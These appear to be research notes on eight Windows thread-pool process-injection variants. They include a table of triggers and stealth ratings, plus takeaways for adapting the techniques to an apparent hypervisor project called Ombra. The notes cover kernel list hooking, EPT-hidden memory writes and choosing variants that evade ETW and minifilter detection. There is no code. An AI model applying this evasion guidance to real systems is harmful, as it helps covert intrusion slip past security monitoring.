| Variant | Handles Required | Trigger Mechanism | Complexity | Stealth | Artifacts |
|---------|------------------|-------------------|------------|---------|-----------|
| #1 StartRoutineOverwrite | WorkerFactory | Thread creation | Low | Very Low | Corrupted pool |
| #2 TpWorkInsertion | WorkerFactory | Task queue dispatch | Medium | Medium | Queue modification |
| #3 TpWaitInsertion | IoCompletion | Event signal | Medium | High | Named event |
| #4 TpIoInsertion | IoCompletion | File I/O | High | High | File on disk |
| #5 TpAlpcInsertion | IoCompletion | ALPC connection | High | Medium | Named ALPC port |
| #6 TpJobInsertion | IoCompletion | Job assignment | Medium | Medium | Named job object |
| #7 TpDirectInsertion | IoCompletion | Direct queue | Low | Medium | Direct syscall |
| #8 TpTimerInsertion | WorkerFactory + Timer | Timer expiration | Very High | High | Timer queue mod |

---

## KEY TAKEAWAYS FOR OMBRA

### Applicable Patterns for Hypervisor Context

1. **Handle Duplication Technique** (`HandleHijacker.cpp`):
   - Generic pattern for stealing object handles from target process
   - Can be adapted for kernel object handle theft
   - Useful for hijacking device handles, section objects, etc.

2. **Structure Manipulation via Memory Writes**:
   - All variants demonstrate writing complex structures cross-process
   - Kernel equivalent: Mapping guest physical memory, modifying structures in-place
   - EPT can hide modifications from integrity checks

3. **Execution Triggers**:
   - Event signaling (Variant 3) - Can trigger via kernel event objects
   - Timer expiration (Variant 8) - DPC timer manipulation in kernel
   - Direct queue insertion (Variant 7) - Directly queuing APCs or DPCs

4. **Non-Destructive Injection**:
   - Variants 2-8 avoid corrupting original functionality
   - Hypervisor should aim for similar: inject without breaking guest operation

### Structural Insights for Kernel Pool Manipulation

- **Priority Heap Structures** (`TPP_PH`, `TPP_PH_LINKS`): Similar to kernel deferred procedure call (DPC) queues
- **List Entry Manipulation**: Direct translation to kernel `LIST_ENTRY` hooking (e.g., PsLoadedModuleList)
- **Reference Counting** (`TPP_REFCOUNT`): Kernel object reference count manipulation to prevent premature cleanup

### Detection Surface Analysis

**High Detection Risk**:
- Variant 1: Corrupts thread pool state (crashes likely)
- Named objects (Variants 3, 5, 6): ETW events for object creation
- File I/O (Variant 4): File system mini-filter monitoring

**Lower Detection Risk**:
- Variant 7: Minimal API surface, direct syscall
- Variant 8: Timer operations are common, but complex

**For Hypervisor Implementation**:
- Prefer Variant 7-style direct manipulation when possible
- Avoid named kernel objects (detectable via object manager callbacks)
- Use EPT to hide memory writes during structure modification

---

**Research Complete**
**Extraction Date**: 2025-12-20
**Total Variants Documented**: 8
**Primary Innovation**: Comprehensive thread pool object exploitation via handle duplication
